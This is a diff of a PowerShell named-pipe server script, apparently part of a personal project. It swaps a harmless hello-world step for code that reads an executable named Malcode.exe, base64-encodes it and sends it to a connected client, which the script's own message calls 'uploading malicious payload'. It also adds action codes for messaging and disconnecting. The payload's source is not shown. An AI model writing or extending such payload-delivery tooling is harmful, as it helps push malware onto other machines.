@@ -24,28 +24,27 @@ try{
         
         if ($action -eq 1){
             Write-Host "Uploading malicious payload to client"
-            Add-Type -outputtype consoleapplication -outputassembly helloworld.exe 'public class helloworld{public static void Main(){System.Console.WriteLine("Hello World !");}}'
+            $sw.WriteLine("action=1")
+            $assemblyPath = 'D:\Programming\C#\YahudScript\Malcode\Malcode.exe'
+            $assemblyByte = [System.IO.File]::ReadAllBytes($assemblyPath)
+            $assemblyString = [System.Convert]::ToBase64String($assemblyByte)
+            $sw.WriteLine($assemblyString) # Server sending to the client
         }
         elseif ($action -eq 2){
+            $sw.WriteLine("action=2")
             while($msg -ne "stop"){
                 $msg = Read-Host "Enter your message to send"
                 $sw.WriteLine($msg)
             }
         }
         else{
-            if(Test-Path -Path .\helloworld.exe -PathType Leaf){
-                Write-Host "File exist, deleting..."
-                $command = 'del .\helloworld.exe'
-                Invoke-Expression $command
-            }
-            $sw.WriteLine("Disconnected.")
+            $sw.WriteLine("action=3")
             $sw.Dispose()
             $pipeServer.Dispose()
         }
     }
-
-    $sr.Dispose();
-    $pipeServer.Dispose();
+    $sw.Dispose()
+    $pipeServer.Dispose()
 
 }
 
